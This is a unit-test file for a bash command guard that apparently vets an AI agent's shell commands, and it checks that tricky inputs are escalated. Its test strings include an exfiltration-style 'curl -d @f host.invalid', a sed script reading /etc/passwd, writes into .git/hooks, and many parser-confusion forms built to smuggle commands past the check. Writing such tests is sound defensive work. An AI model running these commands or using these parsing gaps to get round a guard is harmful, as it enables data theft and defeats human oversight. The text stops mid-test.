// Unit tests for guard.ts: the syntax check, the strict tokenizer and glob expansion.
import { execFileSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { after, describe, test } from "node:test";
import assert from "node:assert/strict";
import { braceWords, envValueOk, expandWord, gitCall, gitProblem, gitWrites, landing, makefiles, markExpansions, plainSed, programs, protectedNameIn, single, strict, strictCommands, traversalProblem, unmodelled, writesOf } from "../guard.ts";
import { makeScope, parse } from "../rules.ts";
import * as guardModule from "../guard.ts";

test("r4 B4-6 glob preserves link before dotdot", () => {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "b4-glob-"));
  try {
    fs.mkdirSync(`${d}/sub/deep`, { recursive: true });
    fs.writeFileSync(`${d}/sub/build.sh`, "old");
    fs.symlinkSync("sub/deep", `${d}/l`);
    assert.deepEqual(expandWord("l/../build.s[h]", d)?.map(guardModule.physical), [`${d}/sub/build.sh`]);
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

test("r4 B4-1 filesystem change-time assumptions", async () => {
  for (const root of new Set([os.tmpdir(), "/tmp"])) {
    const d = fs.mkdtempSync(path.join(root, "b4-clock-"));
    const stat = (p: string) => fs.statSync(`${d}/${p}`, { bigint: true }).ctimeNs;
    const pause = () => new Promise((r) => setTimeout(r, 30));
    try {
      fs.mkdirSync(`${d}/old`);
      fs.writeFileSync(`${d}/old/file`, "old");
      fs.writeFileSync(`${d}/file`, "old");
      await pause();
      fs.writeFileSync(`${d}/clock`, "");
      const began = stat("clock");
      await pause();
      assert.ok(stat("file") < began);
      fs.renameSync(`${d}/file`, `${d}/moved`);
      assert.ok(stat("moved") >= began, `${root}: rename must change ctime`);
      fs.renameSync(`${d}/old`, `${d}/new`);
      assert.ok(stat("new/file") < began, `${root}: directory rename needs a directory mark`);
      for (const mutate of [
        () => fs.appendFileSync(`${d}/new/file`, "new"),
        () => fs.utimesSync(`${d}/new/file`, 0, 0),
        () => fs.chmodSync(`${d}/new/file`, 0o700),
        () => fs.linkSync(`${d}/new/file`, `${d}/hard`),
        () => fs.copyFileSync(`${d}/moved`, `${d}/copy`),
      ]) {
        mutate();
        assert.ok(stat("new/file") >= began);
      }
      assert.ok(stat("hard") >= began);
      assert.ok(stat("copy") >= began);
    } finally { fs.rmSync(d, { recursive: true, force: true }); }
  }
});

test("r4 B4-6 physical rejects an unfinished walk", () => {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), "b4-walk-"));
  try {
    fs.symlinkSync("loop", `${d}/loop`);
    assert.throws(() => guardModule.physical(`${d}/loop/file`), guardModule.PathWalkError);
  } finally { fs.rmSync(d, { recursive: true, force: true }); }
});

test("r4 B4-1 rsync consumes checksum-seed's value", () => {
  const got = writesOf(parse("rsync -a src/ scripts/ --checksum-seed 1").cmds);
  assert.ok(got.writes.some((w) => w.word === "scripts/"));
  assert.ok(!got.writes.some((w) => w.word === "1"));
});

test("r4 B4-1 attached patch and compiler outputs are judged as writes", () => {
  for (const command of ["patch -o.git/hooks/x f", "patch --output=.git/hooks/x f", "gcc -o.git/hooks/x f.c", "clang -o.git/hooks/x f.c", "sort --out=.git/hooks/x f"])
    assert.ok(writesOf(parse(command).cmds).writes.some((w) => w.word === ".git/hooks/x" && !w.checked), command);
});

test("r4 B4-6 one-operand ln records its implicit basename", () => {
  assert.ok(writesOf(parse("ln -s dir/script.sh").cmds).writes.some((w) => w.word === "script.sh"));
});

test("r4 B4-1 ctime verdict carries the changed code to the model", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "b4-code-"));
  try {
    const file = `${dir}/script.sh`;
    fs.writeFileSync(file, "echo changed\n");
    const verdict = guardModule.argvGuard(parse("./script.sh").cmds[0], {
      began: 0n, cwd: dir, cwdKnown: true, scope: makeScope(dir, []),
      written: () => new Set(), resolve: (word) => path.resolve(dir, word),
    });
    assert.equal(verdict?.action, "classify");
    assert.deepEqual(verdict?.files, [file]);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

describe("unmodelled", () => {
  for (const c of [
    "echo $'a'", "echo $\"a\"", "ls >&2#x", "ls 2>&1x", "cat <<E\"OF\"\nx\nEOF", "cat <<\\EOF\nx\nEOF", "cat <<EOF\nx\n EOF\n", "cat <<-EOF\nx\n  EOF\n",
    "cat <<EOF", "echo `a \\` b`", "echo $(echo \")\")", "echo ${x@P}", "echo 'unterminated", "echo \"unterminated", "cat <<EOF\n$(echo ')')\nEOF",
  ]) test(`asks: ${JSON.stringify(c)}`, () => assert.ok(unmodelled(c), c));
  for (const c of [
    "echo a # b", "# only a comment", "echo 'a#b' \"$x#y\"", "echo $# ${#x} ${x#y} ${x%%z}", "ls 2>&1 | head", "ls >&2", "cat <<EOF\nx # y $'z'\nEOF\nls", "cat <<-'EOF'\n\tx\n\tEOF",
    "a <<A <<B\n1\nA\n2\nB\necho done", "echo $(ls (a) 2>/dev/null) `date`", "cat <<<word", "echo \"$(date)\" '$(not run)'", "for f in a b; do echo $f; done",
    // A # inside a word is text for bash and for the parser.
    "echo a#b", "curl http://localhost:3000/#/x", "echo a\\ b#c",
    // Plain forms inside ${...} and arithmetic.
    "echo ${VAR:-default} ${1:-x} \"${arr[@]}\" ${#arr[@]} ${arr[0]} ${x//\\//_} ${x:2:3} ${x: -1} ${x^^} \"${x:-a b}\" ${x:-$(date)}", "i=1; a=2; b=3; n=4; echo $((i+1)) $(( (a + b) * 2 )) $((10#$n))",
    "for ((i=0; i<3; i++)); do echo $i; done", "count=0; (( count++ ))", "mkdir -p src/{a,b} && cp f{,.bak} && ls *.{ts,tsx}", "grep -r --include=*.{ts,tsx} x . --exclude-dir={a,b}",
    // Nested shells whose command is literal.
    "bash -c 'npm test'", "bash -c \"npm test && echo done\"", "sh -c 'echo $HOME; for f in *.ts; do echo \"$f\"; done'", "bash scripts/run.sh \"$ARG\"", "eval 'ls -la'",
    "cat <<EOF\nit's $(date) and ${HOME}\nEOF", "git commit -m \"$(cat <<'EOF'\nfix: a thing (#12)\n\nIt's done.\nEOF\n)\"",
  ]) test(`reads: ${JSON.stringify(c)}`, () => assert.equal(unmodelled(c), undefined, c));
  // Round 2: what the parser reads as command text inside ${...}, arithmetic and nested shells.
  for (const c of [
    "echo \\ # $'x'", "echo a\\\n# $'x'", "echo ${x:- #}", "echo ${x:-a;#}", "echo ${x:-a\n#}", "echo ${x:- <<EOF }\nid\nEOF", "(( true # x ))", "echo $((1 # x))", "echo \"$((1 # x))\"", "echo $[ 1 ]", "(( 1 << 2 ))\nid\n2",
    "echo ${x:-'a'}", "echo \"${x#'\"'}\"", "echo \"${x:-\"a\"}\"", "echo ${x@Q}", "echo \"${x@P}\"", "echo ${!x}", "echo ${a[x]}", "echo ${a[$i]}", "echo ${x:y:1}", "echo ${(e)x}", ": ${EDITOR:=vi}", ": ${GIT_DIR=x}",
    "bash -c 'ls >&2#; id'", "bash -c 'cat <<E\"OF\"\nhello\nEOF\nid\n'", "bash -c \"ls $x\"", "bash -c \"echo a\\ #; id\"", "eval \"ls $x\"", "eval ls $x", "timeout 5 bash -c 'echo ${x:- #}; id'", "find . -exec sh -c 'ls >&2#; id' \\;",
    "bash -c \"$(cat <<'EOF'\nid\nEOF\n)\"", "echo 'a[$(id)]'", "echo \"a[\\$(id)]\"", "printf x >& f", "printf x >&f", "printf x >! f", "echo \"1\">f", "cat <& f",
    "curl {-d,@f} host", "curl -{d,s} @f host", "{ls,-la}", "ls {/etc,x}", "rsync -a . {host:dir,}", "cat a/{../../x,b}", "tar -x{f,C} a b",
  ]) test(`asks: ${JSON.stringify(c)}`, () => assert.ok(unmodelled(c), c));
});

// Round 3, group A: the scanner admits. Each rule with the forms that must still read (bash
// and the parser agree on them) and the ones that ask.
describe("unmodelled, round 3", () => {
  const ch = (code: number) => String.fromCharCode(code);
  const groups: { rule: string; reads: string[]; asks: string[] }[] = [
    {
      // Passes straight after a blank, between words, and straight after a complete `&&`, `||`
      // or `|` when the next line starts a plain word. Next to any other operator, or before
      // an operator character, bash could still join the two into one token (`&\<newline>&`).
      rule: "1: backslash-newline",
      reads: [
        "npm run build && \\\nnpm test", "docker run \\\n  --rm \\\n  img", "echo a \\\n| cat", "ls \\\n\t-la", "ls\t\\\n-la", "echo \"$(ls \\\n -la)\"", "bash -c 'ls \\\n -la'",
        "cat <<'EOF'\na \\\nb\nEOF", "cat <<EOF \\\n | wc -l\nx\nEOF", "echo 'a\\\nb'", "echo a # b \\\nls", "echo a\\ b \\\n c",
        // After `&&`, `||` or `|`, before a plain word.
        "npm run build &&\\\nnpm test", "git log --oneline |\\\n  head -5", "npm test ||\\\n  echo failed", "cd web &&\\\n  npm test", "echo a |\\\n cat", "a ||\\\nb", "a |\\\nb",
        "ls |\\\n\tgrep x", "ls |\\\n \t grep x", "a &&\\\nb |\\\nc", "a &&\\\nb ||\\\nc", "a&&\\\nb", "a ||\\\n./run", "a &&\\\n/bin/ls", "a &&\\\n~/bin/x", "a &&\\\n_x", "a |\\\n-x", "a |\\\n2>/dev/null cat",
        "echo $(a |\\\n b)", "bash -c 'a &&\\\nb'", "cat <<EOF |\\\nwc -l\nx\nEOF", "cat <<'EOF' &&\\\nls\nx\nEOF", "[[ -f x ]] &&\\\nls", "[[ a ||\\\nb ]]", "if a; then b |\\\n c; fi",
      ],
      asks: [
        "echo a\\\nb", "echo \"a \\\n b\"", "echo $\\\n(id)", "echo \"$\\\n(id)\"", "cat <\\\n<EOF\nx\nEOF", "(\\\n( 1 ))", "echo $\\\n{x}", "echo $\\\n'x'",
        "cat <<EOF\nEO\\\nF\nid\nEOF", "cat <<EOF\na \\\nb\nEOF", "cat <<EOF\nx\\\nEOF\nid\nEOF", "cat <<E\\\nOF\nx\nEOF", "curl \"-\\\nd\" x", "echo `ls \\\n-la`", "echo ${x:-a \\\nb}", "echo $(( 1 \\\n+ 1 ))",
        "echo \\\n\\\nid", "\\\nls", "ls;\\\nid", "echo a\\ \\\nb", "echo a\\", "bash -c 'echo a\\'",
        // After an operator other than a complete `&&`, `||` or `|`.
        "a &\\\nb", "a &\\\n& b", "a ;\\\nb", "a |&\\\nb", "a >\\\nb", "a <\\\nb", "a >|\\\nb", "a &>\\\nb", "a 2>&1|&\\\nb", "(\\\nls)", "a $(\\\nls)", "a ;;\\\nb",
        // Before something that is not a plain word.
        "a &&\\\n&b", "a &&\\\n|b", "a |\\\n|b", "a |\\\n&b", "a ||\\\n|b", "a |\\\n;b", "a &&\\\n<f b", "a &&\\\n>f b", "a &&\\\n'b'", "a &&\\\n\"b\"", "a &&\\\n#b\nc", "a &&\\\n(b)",
        "a &&\\\n{ b; }", "a &&\\\n$b", "a &&\\\n`b`", "a &&\\\n\\\nb", "a &&\\\n \\\nb", "a &&\\\n\\b", "a &&\\\n\nb", "a &&\\\n", "a &&\\\n  ", "a &&\\\n!b", "a &&\\\n*", "a &&\\\n=b", "a |\\\n@b", "a |\\\n%b",
        // Inside a word, quotes, substitutions and heredocs.
        "echo a|b\\\nc", "echo \"a &&\\\nb\"", "echo `a |\\\nb`", "echo ${x:-a |\\\nb}", "echo $(( 1 ||\\\n2 ))", "cat <<EOF\na |\\\nb\nEOF", "cat <<EOF |\\\n\nx\nEOF", "bash -c \"a &&\\\nb\"",
        "[[ a |\\\nb ]]", "i=0 &&\\\n(( i++ ))",
      ],
    },
    {
      rule: "2: control characters and Unicode line separators",
      reads: ["echo 'tab\there'", "printf 'a\\tb\\n'", `echo "caf${ch(0xe9)}" caf${ch(0xe9)}`, `echo 'a${ch(0xa0)}b'`],
      asks: [
        "echo a\rb", "echo 'a\rb'", "echo \"a\rb\"", "cat <<'EOF'\nx\rEOF\nEOF", "cat <<EOF\nx\rEOF\necho '\nEOF\nid #'", `cat <<EOF\nx${ch(0x2028)}EOF\nEOF`, `echo "${ch(0x2029)}"`, `echo ${ch(0x1b)}[0m`,
        `echo 'a${ch(0)}'`, `echo a${ch(0x0b)}b`, `echo a${ch(0x0c)}b`, `echo ${ch(0x7f)}`, `echo ${ch(0x85)}`, `# a comment${ch(0x0d)}`, `echo a${ch(0xa0)}b`, `echo a${ch(0x3000)}b`,
      ],
    },
    {
      rule: "3: >& and <& are not arithmetic",
      reads: ["i=1; (( i > 2 && i < 5 ))", "i=1; echo $(( i >= 2 ))", "i=1; (( i >>= 1 ))", "i=1; echo $(( i & 3 | 4 ))", "echo $(( 1 > 2 ))"],
      asks: ["(( 1 >&2 ))", "(( 1 >&2# x ))", "echo $(( 1 >&-# x ))", "echo $(( 1 <&3 ))", "(( 1 &> 2 ))", "echo \"$(( 1 >&2 ))\"", "(( 1 # x ))", "(( 1#2 # x ))"],
    },
    {
      rule: "4: extglob, [[ ]] and options that change how bash reads",
      reads: [
        "[[ -f x ]] && echo y", "[[ \"$a\" == \"b\" ]] || exit 1", "if [[ -n $x && -d dir ]]; then ls; fi", "[[ $x =~ ^[0-9]+$ ]]", "[[ a < b ]]", "[[ a == b ]];ls", "[[ a == b ]]\nls", "( [[ -d x ]])",
        "set -euo pipefail", "set -e", "set +e", "set -o pipefail", "set -- a b", "set -- \"$@\"", "bash -lc 'ls'", "bash -euo pipefail -c 'ls'", "sh -ec 'ls'", "bash --norc --noprofile -c 'ls'",
        "echo a*b ?x [ab]", "f() { ls; }", "ls *.ts", "echo $(( 2 *(3+4) ))", "( ls )", "! true", "echo 'shopt -s extglob'", "grep -n shopt f", "echo \"@(a|b)\"",
      ],
      asks: [
        "shopt -s extglob", "shopt -u nullglob", "shopt", "command shopt -s extglob", "if shopt -q extglob; then ls; fi", "echo $(shopt -s extglob)", "bash -c 'shopt -s extglob'",
        "bash -O extglob -c 'ls'", "bash +O extglob -c 'ls'", "bash -cO extglob 'ls'", "bash -Oc extglob 'ls'", "sh -O extglob -c ls", "timeout 5 bash -O extglob -c ls", "bash -O extglob script.sh",
        "echo @(a|b)", "ls !(x)", "echo +(a)", "echo *(a)", "echo ?(a)", "x=@(a|b)", "echo a@(b| #)", "case x in @(x| #) ) ;; esac", "if !(true); then :; fi",
        "[[ x == @(a|b) ]]", "[[ x == !(a| #) ]]", "[[ x =~ (a|b) ]]", "[[ x =~ (a| #) ]]", "[[ ( a == b ) ]]", "[[ a == b", "[[ a == b\n]]", "[[ a == b ; ]]", "[[ a =~ a|b ]]",
        "set -H", "set -o history", "set -o histexpand", "set -eH", "set -k", "set -o posix", "set $opts", "set -$x", "builtin set -H",
        "bash -i -c 'ls'", "bash -ic 'ls'", "bash --posix -c ls", "bash -o posix -c ls", "bash -H -c ls", "bash -s -c ls", "bash $opts -c ls", "bash build.sh -c true",
      ],
    },
    {
      rule: "5: an expansion and a brace expansion in one word",
      reads: ["echo $x {a,b}", "mkdir -p src/{a,b}", "echo ${x}", "find . -exec echo $x{} \\;", "echo \"$x{a,b}\"", "echo '$x'{a,b}", "echo $x{a}", "cp f{,.bak}"],
      asks: [
        "echo $e{a,b}", "echo ${e}{a,b}", "echo \"$e\"{a,b}", "echo $(true){a,b}", "echo `true`{a,b}", "echo {a,$x}", "cp \"$f\"{,.bak}", "echo <(true){a,b}", "echo $1{a,b}", "echo $@{a,b}", "echo {1..3}$x",
        "find build $e{-delete,}", "find . {${e}-delete,}", "echo ${e:-}{a,b}", "echo {a,b}\"$x\"",
      ],
    },
    {
      // A name passes when the command sets it to a plain integer before the use, where every
      // run reaches the assignment, and names it nowhere else in a way that could give it text.
      rule: "6: variables in arithmetic",
      reads: [
        "i=0; (( i++ ))", "i=0; echo $((i+1))", "n=3; for ((i=0; i<n; i++)); do echo $i; done", "i=0; while [ $i -lt 3 ]; do i=$((i+1)); done; echo \"$i\"", "(( i = 5 )); echo $(( i * 2 ))",
        "i=2; echo ${x:i} ${x:1:i} ${x: -1} ${a[i]} ${a[$i]} ${a[@]:i}", "i=0; a[i]=1", "i=1; [[ $i -eq 1 ]]", "i=1; [[ i -lt 2 && \"$i\" -ge 0 ]]", "[[ $# -eq 0 ]]", "echo $(( $# + 1 )) $(( ${#x} + $? ))",
        "bash -c 'i=0; (( i++ ))'", "echo $((1+2)) $((0x1f)) $((16#ff))", "i=0\nj=-1\n(( i += j ))", "i=0 && (( i ))", "count=0; for f in a b; do (( count++ )); done; echo $count", "i=0; echo $(echo $(( i + 1 )))",
      ],
      asks: [
        "(( i++ ))", "echo $((i+1))", "(( ls ))", "i=x; (( i ))", "i=0; i=x; (( i ))", "i=0; (( i )); i=x", "i=0; i+=x; (( i ))", "i=0; i=$(cat f); (( i ))", "i=0; read i; (( i ))", "i=0; read -r line; (( i ))",
        "for i in 1 2; do (( i )); done", "i=0; for i in a; do :; done; (( i ))", "i=0; printf -v i %s x; (( i ))", "i=0; mapfile i; (( i ))", "i=0; local i=x; (( i ))", "i=0; export i; (( i ))",
        "i=0; declare -n r=i; r=x; (( i ))", "( i=0 ); (( i ))", "true && i=0; (( i ))", "i=0 | cat; (( i ))", "i=0 & (( i ))", "if true; then i=0; fi; (( i ))", "{ i=0; }; (( i ))", "(( i )); i=0", "i=0 true; (( i ))",
        "echo $(i=0); (( i ))", "I=0; (( I ))", "_=0; (( _ ))", "i=0; echo \"i\"; (( i ))", "i=0; (( i + $1 ))", "i=0; (( i + $(cat f) ))", "i=0; (( i + `cat f` ))", "i=0; (( a[i] ))", "i=0; : ${i:=x}; (( i ))",
        "i=0; r''ead i; (( i ))", "i=0; $cmd; (( i ))", "i=0; r{ea,}d x; (( i ))", "i=0; eval x; (( i ))", "i=0; . ./f; (( i ))", "i=0; bash -c '(( i ))'", "i=0; unset i; (( i ))", "i=0; i[0]=x; (( i ))",
        "x=y; echo ${a[x]}", "echo ${x:y}", "echo ${x:0:y}", "echo ${a[1+1]}", "a[x]=1", "a=([x]=1)", "a[b[0]]=1", "[[ $x -eq 1 ]]", "[[ x -lt 1 ]]", "[[ 1 -ge \"$(cat f)\" ]]", "[[ -v x ]]",
        "i=0; echo $(( ${i:-1} ))", "i=0; echo $(( $i$j ))", "(( x = y ))",
      ],
    },
    {
      rule: "item 3: a nested shell that is not bash, sh or dash",
      reads: ["bash -c ls", "sh -c ls", "dash -c ls", "timeout 5 bash -c 'ls -la'", "zsh --version", "which zsh", "zsh script.zsh", "grep -c zsh f"],
      asks: [
        "zsh -c 'ls'", "zsh -c '{ ls } always { id }'", "ksh -c ls", "timeout 5 zsh -c ls", "env zsh -c ls", "env -i X=1 zsh -c ls", "xargs zsh -c ls", "/usr/bin/zsh -c ls", "zsh -fc ls", "zsh -o extendedglob -c ls",
        "fish -c ls", "mksh -c ls", "ksh93 -c ls", "csh -c ls", "bash -c 'zsh -c ls'", "sudo ksh -c ls", "find . -exec zsh -c ls \\;", "z''sh -c ls", "nohup nice zsh -c ls", "eval zsh -c ls",
      ],
    },
    {
      // Found by the trace oracle at 20,000 inputs: bash runs these words as programs; the
      // rules read them without their quotes, as an assignment or a keyword, and drop them.
      rule: "a command name the rules drop",
      reads: ["FOO=bar ls", "env \"FOO=bar\" ls", "docker run -e \"FOO=bar\" img", "make \"CC=gcc\"", "grep -rn \"function\" f", "echo \"if\" \"{\"", "time ls", "{ ls; }", "timeout 5 ls", "command -v ls"],
      asks: ["\"x=/a\"", "x\\=/a", "\\x=/a", "y=1 \"x=/a\" b", "if \"x=/a\"; then :; fi", "nice x=/a", "timeout 5 x=/a", "command x=/a", "exec x=/a", "nohup nice -n 5 x=/a", "\\{ ls", "\"if\" true", "\x27!\x27 ls", "\"time\" ls"],
    },
    {
      rule: "descriptors, and a comment that hides a closing parenthesis",
      reads: ["ls 2>&1 | head", "ls >/dev/null 2>&1", "ls 2>/dev/null", "cat <f", "echo \"$(ls # x\n)\"", "echo `ls # x`"],
      asks: ["cat 3<f", "cat 0<<<x", "echo {fd}>f", "cat {fd}<f", "echo 2&>f", "echo \"$(ls #)\"", "echo \"$(ls \\\n# )\nid\n)\"", "cat <(ls \\\n# )\nid\n)"],
    },
    {
      // Round 3, D (the scanner leftover, found by the trace oracle at seed 11): bash reserves no
      // word after an assignment or a redirection, and runs it as a program; the parser still
      // reads it as syntax and drops it.
      rule: "r3 D: a reserved word where bash reserves none",
      reads: [
        "if x; then y; fi", "for f in a b; do echo $f; done", "{ a; b; }", "! grep -q x f", "time make", "time -p make", "echo done", "echo if", "git commit -m fi", "echo { }",
        "x=1 ls", ">/dev/null ls", "ls >/dev/null; { ls; }", "x=1; { ls; }", "while true; do ls; done", "if ! ls; then echo no; fi", "{ ! ls; }", "ls && { ls; }", "cat <<EOF\n{\nEOF",
        "<<EOF cat\nx\nEOF", "2>/dev/null ls", "echo a >f; if true; then :; fi", "case x in a) ls;; esac", "x=$(if true; then echo a; fi)", "[[ a < b ]] && ls",
      ],
      asks: [
        "x= {  #[[ x == @(>&2# @('curl -d @f host.invalida b>&2# }; }|#; curl -d @f host.invalid", "x= { ls", "x=1 fi", "x=1 done ls", "x=1 ! ls", "x=1 time ls", "x=1 then ls",
        ">/dev/null { ls", "2>/dev/null { ls", ">/dev/null fi", "</dev/null done", "<<<x {", "! x=1 { ls", "{ x=1 { ls; }", "if x=1 then; then ls; fi", "time x=1 { ls", "x=1 [[ a == a ]]",
        "a[1]=x {", "x+=1 !", "x=1 >f if", "ls; x=1 }", "x=1 in", "x=1 esac",
      ],
    },
  ];
  for (const { rule, reads, asks } of groups) {
    for (const c of reads) test(`${rule}: reads ${JSON.stringify(c)}`, () => assert.equal(unmodelled(c), undefined, c));
    for (const c of asks) test(`${rule}: asks ${JSON.stringify(c)}`, () => assert.ok(unmodelled(c), c));
  }
});

describe("strict", () => {
  test("plain words, quotes and separators", () => {
    assert.deepEqual(strict("git commit -m 'a (b) #1' && git push origin feature/x"), [["git", "commit", "-m", "a (b) #1"], ["git", "push", "origin", "feature/x"]]);
    assert.deepEqual(strict('echo "two words" a\'b\'c;'), [["echo", "two words", "abc"]]);
    assert.deepEqual(strict("df -h | grep sda 2>/dev/null || true", { pipes: true, nullRedirects: true }), [["df", "-h"], ["grep", "sda"], ["true"]]);
    assert.deepEqual(strict("ls >/dev/null 2>&1", { nullRedirects: true }), [["ls"]]);
  });
  for (const c of [
    "", "ls &&", "ls ;; ls", "ls | cat", "ls > f", "ls 2>/dev/null", "echo $x", "echo `x`", "echo $(x)", "echo *", "echo a{b,c}", "echo a\\ b", "echo \"$x\"", "echo \"a\\\"b\"", "ls & id",
    "ls\nid", "FOO=1 ls", "echo #x", "echo (x)", "echo 'x", "ls <f", "echo !x", "ls >/dev/nullx",
  ]) test(`refuses: ${JSON.stringify(c)}`, () => assert.equal(strict(c), undefined));
  test("null redirects only where asked for, and only to /dev/null", () => {
    assert.equal(strict("ls > /tmp/x", { nullRedirects: true }), undefined);
    assert.equal(strict("ls 2>&3", { nullRedirects: true }), undefined);
  });
});

describe("single", () => {
  const work = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "automode-single-")));
  fs.mkdirSync(path.join(work, "sub", "deep"), { recursive: true });
  fs.mkdirSync(path.join(work, "elsewhere", "inner"), { recursive: true });
  fs.symlinkSync(path.join(work, "elsewhere", "inner"), path.join(work, "link"));
  fs.mkdirSync(path.join(work, "~", "work"), { recursive: true });
  after(() => fs.rmSync(work, { recursive: true, force: true }));
  test("one command, after cd and under timeout", () => {
    assert.deepEqual(single("cd sub && timeout 15 ssh lab uptime", work), { dir: path.join(work, "sub"), argv: ["ssh", "lab", "uptime"], texts: ["timeout 15 ssh lab uptime", "ssh lab uptime"] });
    assert.equal(single("cd", work), undefined);
    assert.equal(single("cd a b && ls", work), undefined);
    assert.equal(single("ls && cd x", work), undefined);
    assert.equal(single("ls; id", work), undefined);
    assert.equal(single("cd ~root && ls", work), undefined);
  });
  // Finding 14: the directory that is checked must be the one bash ends up in.
  test("14: cd grants nothing unless bash runs the command there or not at all", () => {
    assert.equal(single("cd sub; ls", work), undefined, "after `;` a failed cd still runs the command");
    assert.equal(single("cd nope && ls", work), undefined, "a directory that does not exist");
    assert.equal(single(`cd ${work}/nope/.. && ls`, work), undefined, "bash refuses a path through a missing directory");
    // B3c: bash goes by the text, so `link/..` is `.` (it was undefined while the check could not
    // tell which reading bash takes).
    assert.equal(single("cd link/.. && ls", work)?.dir, work, "`..` after a symbolic link: bash goes by the text");
    assert.equal(single("cd sub/deep/.. && ls", work)?.dir, path.join(work, "sub"));
    assert.equal(single("cd link && ls", work)?.dir, path.join(work, "elsewhere", "inner"), "the real directory is what gets checked");
    assert.equal(landing(work, "link/.."), undefined);
    assert.equal(landing(work, "sub"), path.join(work, "sub"));
  });
  // Finding 15: bash does not expand a quoted tilde.
  test("15: a quoted ~ grants nothing", () => {
    assert.equal(single("git -C '~/work' fetch origin", work), undefined);
    assert.equal(single('git -C "~/work" fetch origin', work), undefined);
    assert.equal(single("cd '~/work' && git fetch", work), undefined);
    assert.ok(single("git -C sub fetch origin", work));
    assert.deepEqual(strictCommands("cd a && ls; id")?.map((c) => c.before), [undefined, "&&", ";"]);
  });
  // Round 3, finding 7: bash expands a leading `~` only when it is unquoted up to the first
  // unquoted `/` (probed in bash 5.2: `~'/x'`, `~"/x"`, `''~/x`, `~'/'x` all stay `~/x`), turns
  // `~+`, `~-` and `~user` into other directories, and expands `~` after `=` and `:` in a word
  // shaped like an assignment (`a=~/x`, `a=b:~/x`).
  const tildeWord = (c: string) => strictCommands(c)?.some((x) => x.quotedTilde);
  for (const c of [
    "git -C ~'/work' fetch origin",
    'git -C ~"/work" fetch origin',
    "git -C ''~/work fetch origin",
    'git -C ""~/work fetch origin',
    "git -C ~'/'work fetch origin",
    "git -C ~\"\"/work fetch origin",
    "cd ~'/work' && git fetch",
    "cd ''~/work && git fetch",
    "git -C ~+/sub fetch origin",
    "git -C ~- fetch origin",
    "git -C ~root fetch origin",
    "git -C a=~/work fetch origin",
    "git -C a=b:~/work fetch origin",
    "git -C x:~/work fetch origin",
  ]) {
    test(`r3 7: grants nothing: ${c}`, () => {
      assert.ok(tildeWord(c), c);
      assert.equal(single(c, work), undefined);
    });
  }
  for (const c of ["git -C ~/work fetch origin", "git -C ~/'work' fetch origin", "git -C ~ fetch origin", "git log HEAD~1", "git push origin HEAD~1:feature/x", "git commit -m 'a ~ b'"]) {
    test(`r3 7: an ordinary ~: ${c}`, () => assert.equal(tildeWord(c), false, c));
  }
});

describe("braces and sed scripts", () => {
  test("brace words", () => {
    assert.deepEqual(braceWords("a{b,c}d"), ["abd", "acd"]);
    assert.deepEqual(braceWords("{a,b}{1,2}"), ["a1", "a2", "b1", "b2"]);
    assert.deepEqual(braceWords("x{}y{a}"), ["x{}y{a}"]);
    // Round 4, finding 2: every group and every range is expanded, however many there are
    // (test/glob.test.mts holds the whole table to bash); what cannot be listed is undefined.
    assert.deepEqual(braceWords("{1..5}"), ["1", "2", "3", "4", "5"]);
    assert.deepEqual(braceWords("{,}{,}{,}{,}{,}{,}{-delete,}")?.filter(Boolean).length, 64);
    assert.deepEqual(braceWords("{{{{{{{-delete,},},},},},},}")?.filter(Boolean), ["-delete"]);
    assert.deepEqual(braceWords("{https://host/,-T}{f..f}"), ["https://host/f", "-Tf"]);
    assert.equal(braceWords("{1..100000}"), undefined);
    assert.equal(braceWords("{a,b}{c,d}{e,f}{g,h}{i,j}{k,l}{m,n}{o,p}{q,r}{s,t}{u,v}{w,x}"), undefined);
    assert.equal(braceWords("{a..3}"), undefined);
  });
  for (const script of ["s/a/b/", "s/a/b/g", "s|a/b|c|", "1,5p", "/foo/d", "$d", "5q", "/a/,/b/p", "s/a/b/;s/c/d/g", "1!G", "y/abc/xyz/", "/^#/d"]) test(`plain sed: ${script}`, () => assert.ok(plainSed(script)));
  for (const script of ["1e id", "e id", "s/a/b/e", "s/a/b/ge", "s/a/b/w out", "w out", "1r /etc/passwd", "2i text", "/x/{e id\n}", "s/a/b/;1e id", "1{s/.*/id/ep}"]) test(`not plain sed: ${script}`, () => assert.ok(!plainSed(script)));
});

describe("git calls", () => {
  test("global options come from an allowlist", () => {
    assert.deepEqual(gitCall(["-C", "x", "--no-pager", "-c", "user.name=a", "log", "-1"]), { dirs: ["x"], sub: "log", rest: ["-1"] });
    for (const words of [["--namespace", "status", "push"], ["--git-dir=.git", "status"], ["-c", "core.pager=x", "log"], ["--exec-path=/x", "status"], ["-p", "log"], ["--config-env=a=b", "log"]])
      assert.equal(typeof gitCall(words), "string", words.join(" "));
  });
  test("found wherever the word git is", () => {
    for (const c of ["xargs git --namespace status push", "echo $(git --namespace a b)", "env X=1 git --work-tree=/ status", "sh -c \"git --namespace status push\"", "git fetch --upload-pac=x ."])
      assert.ok(gitProblem(c), c);
    for (const c of ["git status", "git commit -m 'use git status'", "grep -r git .", "git log --exclude=x"]) assert.equal(gitProblem(c), undefined, c);
    // Round 4, finding 7, second pass: an argument of git itself, echo, printf or the grep family
    // is text where nothing the command prints can run, and is no longer read as a command (that
    // was the price of reading quoted text as a possible command). Where the output can run, it is.
    assert.equal(gitProblem("git commit -m 'git --amend is handy'"), undefined);
    assert.ok(gitProblem("echo 'git --namespace status push' | bash"));
    assert.ok(gitProblem("echo 'git --namespace status push' > x.sh"));
  });
});

describe("expandWord", () => {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "automode-glob-")));
  for (const f of [".env", ".env.local", "a.txt", "b.txt", "sub/c.pem"]) {
    fs.mkdirSync(path.dirname(path.join(dir, f)), { recursive: true });
    fs.writeFileSync(path.join(dir, f), "");
  }
  after(() => fs.rmSync(dir, { recursive: true, force: true }));
  const names = (word: string) => expandWord(word, dir)?.map((p) => path.relative(dir, p)).sort();
  test("globs, braces and dotfiles expand as in bash", () => {
    assert.deepEqual(names(".env*"), [".env", ".env.local"]);
    assert.deepEqual(names(".en?"), [".env"]);
    assert.deepEqual(names("*"), ["a.txt", "b.txt", "sub"]);
